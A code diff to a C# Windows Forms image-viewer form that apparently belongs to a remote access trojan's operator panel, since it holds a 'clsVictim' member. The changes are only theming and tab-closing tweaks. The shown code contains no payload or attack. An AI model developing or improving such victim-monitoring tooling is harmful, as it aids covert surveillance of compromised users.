@@ -13,7 +13,7 @@ using static Alien.clsThemeManager;
 
 namespace Alien
 {
-    public partial class frmFileImage : BaseForm
+    public partial class frmFileImage : Form
     {
         private clsVictim m_victim { get; init; }
         private int m_nImageCount { get; init; }
@@ -103,6 +103,8 @@ namespace Alien
 
             pb.Image = entity.img;
             pb.Refresh();
+
+            ThemeManager.ApplyRange(page.Controls);
         }
 
         private void fnSaveImage(ListViewItem item) => fnSaveImage(new List<stImageEntity>() { fnGetItemTag(item) });
@@ -156,6 +158,13 @@ namespace Alien
             tabControl1.Padding = new Point(30, 5);
 
             new TabZeroHook(tabControl1);
+
+            ThemeManager.ApplyRange(new Control[]
+            {
+                listView1,
+                statusStrip1,
+                toolStrip1,
+            });
 
             tabControl1.DrawItem += (s, e) =>
             {
@@ -217,6 +226,9 @@ namespace Alien
                     TextFormatFlags.VerticalCenter
                 );
 
+                if (e.Index == 0)
+                    return;
+
                 // X button
                 Rectangle closeRect = fnGetCloseRect(e.Index);
 
@@ -248,7 +260,7 @@ namespace Alien
                                 }
 
                                 int nIdx = tabControl1.SelectedIndex;
-                                if (nIdx < 0)
+                                if (nIdx <= 0)
                                     return;
 
                                 if (tabControl1.TabPages.Count > 1)
@@ -268,7 +280,7 @@ namespace Alien
             tabControl1.MouseDown += (s, e) =>
             {
                 int nIdx = fnGetTabIndexAt(e.Location);
-                if (nIdx == -1)
+                if (nIdx == -1 || nIdx == 0)
                     return;
 
                 if (fnGetCloseRect(nIdx).Contains(e.Location))
